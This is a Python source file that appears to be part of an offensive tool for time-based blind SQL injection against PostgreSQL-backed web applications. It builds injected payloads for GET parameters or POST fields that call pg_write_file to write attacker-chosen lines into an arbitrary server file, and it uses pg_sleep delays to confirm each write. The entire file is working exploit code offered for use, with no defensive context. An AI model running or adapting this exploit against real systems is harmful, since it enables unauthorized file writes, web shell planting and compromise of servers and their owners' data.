import httpx
import asyncio
from urllib.parse import quote
from typing import Optional


def escape_pg(val: str) -> str:
    """Escape a string for inclusion in SQL."""
    return val.replace("'", "''")


async def try_write_line_via_get(
    client: httpx.AsyncClient,
    target_url: str,
    inject_param: str,
    line: str,
    filepath: str,
    position: int,
    sleep_time: float,
    is_slow: callable,
) -> bool:
    sql = f"1 AND (SELECT CASE WHEN pg_write_file('{escape_pg(filepath)}', '{escape_pg(line + '\n')}', {position}) THEN pg_sleep({sleep_time}) ELSE pg_sleep(0) END) IS NULL"
    injected_path = f"{target_url}?{inject_param}={quote(sql)}"
    return await is_slow(client, injected_path, sleep_time)


async def try_write_line_via_post(
    client: httpx.AsyncClient,
    target_url: str,
    field: str,
    line: str,
    filepath: str,
    position: int,
    sleep_time: float,
    is_slow: callable,
) -> bool:
    sql = f"1 AND (SELECT CASE WHEN pg_write_file('{escape_pg(filepath)}', '{escape_pg(line + '\n')}', {position}) THEN pg_sleep({sleep_time}) ELSE pg_sleep(0) END) IS NULL"
    data = {field: sql}
    return await is_slow(client, target_url, sleep_time, method="POST", data=data)


async def write_file(
    client: httpx.AsyncClient,
    is_slow: callable,
    target_url: str,
    filepath: str,
    lines: list[str],
    method: str = "GET",
    inject_param: Optional[str] = None,
    form_field: Optional[str] = None,
    sleep_time: float = 2.0,
):
    position = 0
    for line in lines:
        if method.upper() == "GET" and inject_param:
            success = await try_write_line_via_get(
                client,
                target_url,
                inject_param,
                line,
                filepath,
                position,
                sleep_time,
                is_slow,
            )
        elif method.upper() == "POST" and form_field:
            success = await try_write_line_via_post(
                client,
                target_url,
                form_field,
                line,
                filepath,
                position,
                sleep_time,
                is_slow,
            )
        else:
            raise ValueError("Invalid method or missing parameter")

        if not success:
            print(f"[-] Failed to write: {line}")
        else:
            print(f"[+] Wrote: {line}")
        position += len(line) + 1
